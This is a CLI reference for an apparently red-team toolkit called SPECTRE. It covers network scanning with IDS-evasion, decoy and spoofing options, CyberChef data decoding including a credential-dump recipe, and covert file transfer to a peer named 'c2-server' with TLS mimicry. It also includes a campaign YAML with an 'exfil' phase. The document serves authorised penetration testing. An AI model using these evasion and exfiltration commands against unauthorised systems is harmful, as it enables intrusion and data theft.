# SPECTRE CLI Reference

**Version:** 0.1.0 | **Last Updated:** 2026-02-04

---

## Command Overview

```
spectre [OPTIONS] <COMMAND> [ARGS...]

COMMANDS:
    scan        Network scanning (ProRT-IP integration)
    chef        Data analysis (CyberChef integration)
    send        Secure file transfer (WRAITH integration)
    receive     Receive files (WRAITH integration)
    campaign    Campaign management
    workflow    Execute workflow definitions
    config      Configuration management
    status      System status and health
    identity    Identity/key management
    peers       Peer management
    help        Show help information

GLOBAL OPTIONS:
    -v, --verbose       Increase verbosity (-v, -vv, -vvv)
    -q, --quiet         Suppress non-error output
    --config <PATH>     Use alternate config file
    --output <FORMAT>   Output format: text, json, yaml, xml
    -o, --output-file   Write output to file
    --no-color          Disable colored output
    -h, --help          Print help information
    -V, --version       Print version information
```

---

## scan — Network Scanning

Perform network reconnaissance using ProRT-IP integration.

### Basic Syntax

```bash
spectre scan [SCAN_TYPE] [OPTIONS] <TARGETS>
```

### Scan Types

| Flag | Type | Description | Privileges |
|------|------|-------------|------------|
| `-sS` | SYN | Half-open scan (default) | Root/CAP_NET_RAW |
| `-sT` | Connect | Full TCP connect | None |
| `-sF` | FIN | FIN flag only | Root/CAP_NET_RAW |
| `-sN` | NULL | No flags | Root/CAP_NET_RAW |
| `-sX` | Xmas | FIN+PSH+URG | Root/CAP_NET_RAW |
| `-sA` | ACK | ACK flag (firewall mapping) | Root/CAP_NET_RAW |
| `-sU` | UDP | UDP scan | Root/CAP_NET_RAW |
| `-sI <zombie>` | Idle | Idle/zombie scan | Root/CAP_NET_RAW |

### Port Specification

| Option | Description | Example |
|--------|-------------|---------|
| `-p <ports>` | Specific ports | `-p 22,80,443` |
| `-p <range>` | Port range | `-p 1-1000` |
| `-p-` | All 65535 ports | `-p-` |
| `-F` | Fast (top 100) | `-F` |
| `--top-ports <N>` | Top N ports | `--top-ports 1000` |
| `--exclude-ports <P>` | Exclude ports | `--exclude-ports 25,135` |

### Detection Options

| Option | Description |
|--------|-------------|
| `-sV` | Service version detection |
| `-O` | OS fingerprinting |
| `-A` | Aggressive (OS + Service + Scripts) |
| `--version-intensity <0-9>` | Detection probe intensity |
| `--osscan-guess` | Guess OS more aggressively |

### Timing and Performance

| Option | Description |
|--------|-------------|
| `-T<0-5>` | Timing template (0=paranoid, 5=insane) |
| `--rate <N>` | Maximum packets per second |
| `--min-rate <N>` | Minimum packets per second |
| `--timeout <MS>` | Probe response timeout |
| `--retries <N>` | Number of retries |
| `--host-timeout <MS>` | Give up on host after time |

**Timing Templates:**

| Template | Delay | Description |
|----------|-------|-------------|
| T0 (Paranoid) | 5 min | IDS evasion |
| T1 (Sneaky) | 15 sec | IDS evasion |
| T2 (Polite) | 400 ms | Reduced bandwidth |
| T3 (Normal) | Default | Standard scanning |
| T4 (Aggressive) | 10 ms | Fast, reliable networks |
| T5 (Insane) | 5 ms | Very fast networks |

### Evasion Techniques

| Option | Description |
|--------|-------------|
| `-f` | Fragment packets (8-byte) |
| `--mtu <SIZE>` | Custom MTU fragmentation |
| `--ttl <N>` | Set IP TTL |
| `-D <decoys>` | Decoy scanning |
| `-S <IP>` | Spoof source IP |
| `-g <PORT>` | Spoof source port |
| `--badsum` | Send bad TCP/UDP checksums |
| `--data-length <N>` | Append random data |

**Decoy Examples:**
```bash
# 5 random decoys
spectre scan -sS -D RND:5 192.168.1.1

# Specific decoys with your IP
spectre scan -sS -D 10.0.0.1,10.0.0.2,ME 192.168.1.1
```

### Output Options

| Option | Description |
|--------|-------------|
| `-oN <FILE>` | Normal text output |
| `-oX <FILE>` | XML output (nmap-compatible) |
| `-oJ <FILE>` | JSON output |
| `-oG <FILE>` | Greppable output |
| `-oA <BASE>` | All formats (base filename) |
| `--pcap <FILE>` | Packet capture (PCAPNG) |

### Target Specification

```bash
# Single IP
spectre scan -sS 192.168.1.1

# CIDR notation
spectre scan -sS 192.168.1.0/24

# IP range
spectre scan -sS 192.168.1.1-254

# Hostname
spectre scan -sS scanme.nmap.org

# From file
spectre scan -sS --input targets.txt

# Multiple targets
spectre scan -sS 192.168.1.1 192.168.2.0/24 10.0.0.1-50
```

### Examples

```bash
# Basic SYN scan
spectre scan -sS -p 80,443 192.168.1.0/24

# Service detection with aggressive timing
spectre scan -sS -sV -T4 -p 1-1000 192.168.1.1

# Full scan with OS detection
spectre scan -sS -sV -O -A -p- 192.168.1.1

# Stealthy scan with decoys
spectre scan -sS -T1 -D RND:5 -f 192.168.1.1

# UDP scan for DNS and SNMP
spectre scan -sU -p 53,161,162 192.168.1.0/24

# JSON output for processing
spectre scan -sS -sV -p 1-1000 192.168.1.0/24 -oJ results.json
```

---

## chef — Data Analysis

Execute CyberChef operations for data manipulation and analysis.

### Basic Syntax

```bash
spectre chef [OPTIONS] <RECIPE> [--input <FILE>]
```

### Recipe Formats

```bash
# Inline operations (comma-separated)
spectre chef "From_Base64,Gunzip,JSON_Beautify"

# Saved recipe reference
spectre chef @decode-credentials

# Recipe file
spectre chef --recipe-file workflow.json
```

### Input/Output Options

| Option | Description |
|--------|-------------|
| `--input <FILE>` | Input file (- for stdin) |
| `-i <FILE>` | Alias for --input |
| `--output <FILE>` | Output file (default: stdout) |
| `-o <FILE>` | Alias for --output |
| `--format <FMT>` | Output format: text, hex, base64, json |

### Recipe Management

| Option | Description |
|--------|-------------|
| `--list` | List saved recipes |
| `--show <NAME>` | Show recipe details |
| `--save <NAME>` | Save current recipe |
| `--delete <NAME>` | Delete saved recipe |
| `--export <NAME>` | Export recipe to file |
| `--import <FILE>` | Import recipe from file |

### Batch Processing

| Option | Description |
|--------|-------------|
| `--batch` | Process input line by line |
| `--parallel` | Parallel batch processing |
| `--delimiter <D>` | Line delimiter (default: newline) |

### Common Operations

**Encoding/Decoding:**
```bash
spectre chef "From_Base64" --input encoded.txt
spectre chef "To_Base64" --input plaintext.txt
spectre chef "From_Hex" --input hex.txt
spectre chef "URL_Decode" --input url.txt
```

**Compression:**
```bash
spectre chef "Gunzip" --input compressed.gz
spectre chef "Unzip" --input archive.zip
spectre chef "Gzip" --input data.txt
```

**Hashing:**
```bash
spectre chef "MD5" --input file.txt
spectre chef "SHA2,512" --input file.txt
spectre chef "BLAKE3" --input file.txt
```

**Encryption:**
```bash
spectre chef "AES_Decrypt" --input encrypted.bin
spectre chef "XOR" --input data.bin
```

**Extraction:**
```bash
spectre chef "Extract_URLs" --input webpage.html
spectre chef "Extract_IP_addresses" --input logs.txt
spectre chef "Extract_domains" --input text.txt
```

### Examples

```bash
# Decode Base64 and decompress
spectre chef "From_Base64,Gunzip" --input encoded.txt.gz.b64

# Extract IOCs from text
spectre chef "Extract_URLs,Extract_IP_addresses,Unique,Sort" --input malware.txt

# Decode credential dump
spectre chef @decode-credentials --input creds.txt

# Batch process multiple files
cat *.b64 | spectre chef "From_Base64" --batch

# Pipeline with scan results
spectre scan -sS -sV 192.168.1.0/24 -oJ - | spectre chef "Extract_URLs"
```

---

## send — Secure File Transfer

Send files securely using WRAITH protocol.

### Basic Syntax

```bash
spectre send [OPTIONS] <FILE> --peer <PEER_ID>
```

### Options

| Option | Description |
|--------|-------------|
| `--peer <ID>` | Target peer ID or alias |
| `--encrypt` | Enable encryption (default: on) |
| `--no-encrypt` | Disable encryption |
| `--mimicry <TYPE>` | Protocol mimicry: tls, websocket, doh |
| `--compress` | Enable compression |
| `--chunk-size <KB>` | Chunk size in KB (default: 64) |
| `--timeout <SEC>` | Transfer timeout |

### Examples

```bash
# Basic encrypted transfer
spectre send report.pdf --peer abc123...xyz

# With TLS mimicry
spectre send sensitive.db --peer c2-server --mimicry tls

# Compressed transfer
spectre send large-file.tar --peer backup-server --compress

# Using peer alias
spectre send findings.json --peer @team-lead
```

---

## receive — Receive Files

Receive files from peers using WRAITH protocol.

### Basic Syntax

```bash
spectre receive [OPTIONS] --output <DIR>
```

### Options

| Option | Description |
|--------|-------------|
| `--output <DIR>` | Output directory |
| `--accept-from <ID>` | Only accept from specific peers |
| `--auto-accept` | Auto-accept all transfers |
| `--timeout <SEC>` | Receive timeout |
| `--max-size <MB>` | Maximum file size to accept |

### Examples

```bash
# Receive to downloads directory
spectre receive --output ./downloads

# Auto-accept from specific peer
spectre receive --output ./inbox --accept-from abc123 --auto-accept

# With size limit
spectre receive --output ./drops --max-size 100 --auto-accept
```

---

## campaign — Campaign Management

Manage security operation campaigns.

### Subcommands

```bash
spectre campaign new <NAME> [OPTIONS]      # Create new campaign
spectre campaign list                       # List all campaigns
spectre campaign show <NAME>               # Show campaign details
spectre campaign run <FILE>                # Execute campaign definition
spectre campaign status <NAME>             # Check campaign status
spectre campaign pause <NAME>              # Pause active campaign
spectre campaign resume <NAME>             # Resume paused campaign
spectre campaign abort <NAME>              # Abort campaign
spectre campaign export <NAME> [OPTIONS]   # Export campaign data
spectre campaign delete <NAME>             # Delete campaign
```

### Campaign Creation

```bash
spectre campaign new "Operation BLACKOUT" \
    --description "Network reconnaissance" \
    --codename BLACKOUT \
    --targets 192.168.1.0/24
```

### Campaign Definition (YAML)

```yaml
# campaign.yaml
name: red-team-recon
codename: NIGHTFALL
description: Full network reconnaissance

targets:
  - 192.168.1.0/24
  - 10.0.0.0/16

phases:
  - name: discovery
    type: scan
    config:
      scan_type: syn
      ports: "1-1000"
      service_detection: true

  - name: analysis
    type: chef
    depends_on: [discovery]
    config:
      recipe: "@extract-iocs"

  - name: exfil
    type: transfer
    depends_on: [analysis]
    config:
      peer: c2-server
      mimicry: tls

reporting:
  format: [json, html]
  output_dir: ./reports
```

### Examples

```bash
# Create and run campaign
spectre campaign new "Pentest Q1"
spectre campaign run pentest.yaml

# Check status
spectre campaign status "Pentest Q1"

# Export results
spectre campaign export "Pentest Q1" --format json --output results.json
```

---

## workflow — Workflow Execution

Execute multi-step workflows.

### Basic Syntax

```bash
spectre workflow run <FILE>
spectre workflow validate <FILE>
spectre workflow list
```

### Workflow Definition

```yaml
# workflow.yaml
name: scan-analyze-report
steps:
  - id: scan
    action: spectre.scan
    config:
      type: syn
      ports: "1-1000"
      targets: ${targets}

  - id: analyze
    action: spectre.chef
    depends_on: [scan]
    config:
      recipe: "Extract_URLs,Unique"
      input: ${scan.output}

  - id: report
    action: spectre.report
    depends_on: [analyze]
    config:
      format: markdown
      output: findings.md
```

### Examples

```bash
# Run workflow with variables
spectre workflow run scan-workflow.yaml --var targets=192.168.1.0/24

# Validate without running
spectre workflow validate complex-workflow.yaml
```

---

## config — Configuration Management

Manage SPECTRE configuration.

### Subcommands

```bash
spectre config show              # Show current config
spectre config get <KEY>         # Get specific value
spectre config set <KEY> <VAL>   # Set value
spectre config reset             # Reset to defaults
spectre config path              # Show config file path
```

### Examples

```bash
spectre config show
spectre config get scan.default_rate
spectre config set scan.default_rate 5000
spectre config reset
```

---

## status — System Status

Check SPECTRE component health.

### Basic Syntax

```bash
spectre status [OPTIONS]
```

### Options

| Option | Description |
|--------|-------------|
| `--verbose` | Detailed status |
| `--json` | JSON output |
| `--component <C>` | Check specific component |

### Examples

```bash
spectre status
spectre status --verbose
spectre status --component prtip
```

---

## identity — Identity Management

Manage WRAITH identity keys.

### Subcommands

```bash
spectre identity generate [OPTIONS]    # Generate new identity
spectre identity show                  # Show current identity
spectre identity export <FILE>         # Export public key
spectre identity import <FILE>         # Import identity
```

### Examples

```bash
spectre identity generate --output ~/.spectre/identity.key
spectre identity show
spectre identity export public.key
```

---

## peers — Peer Management

Manage known peers.

### Subcommands

```bash
spectre peers list                    # List known peers
spectre peers add <ID> --alias <A>    # Add peer with alias
spectre peers remove <ID|ALIAS>       # Remove peer
spectre peers connect <ID|ALIAS>      # Connect to peer
spectre peers disconnect <ID|ALIAS>   # Disconnect peer
```

### Examples

```bash
spectre peers list
spectre peers add abc123...xyz --alias c2-server
spectre peers connect @c2-server
```

---

## Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Success |
| 1 | General error |
| 2 | Invalid arguments |
| 3 | Permission denied |
| 4 | Component unavailable |
| 5 | Network error |
| 6 | Timeout |
| 126 | Command not executable |
| 130 | Interrupted (Ctrl+C) |

---

## Environment Variables

| Variable | Description |
|----------|-------------|
| `SPECTRE_CONFIG` | Config file path |
| `SPECTRE_VERBOSE` | Verbosity level (0-3) |
| `SPECTRE_OUTPUT_FORMAT` | Default output format |
| `SPECTRE_NO_COLOR` | Disable colored output |
| `SPECTRE_IDENTITY` | Identity file path |

---

## Shell Completion

Generate shell completion scripts:

```bash
# Bash
spectre completion bash > /etc/bash_completion.d/spectre

# Zsh
spectre completion zsh > ~/.zfunc/_spectre

# Fish
spectre completion fish > ~/.config/fish/completions/spectre.fish

# PowerShell
spectre completion powershell > $PROFILE.d/spectre.ps1
```
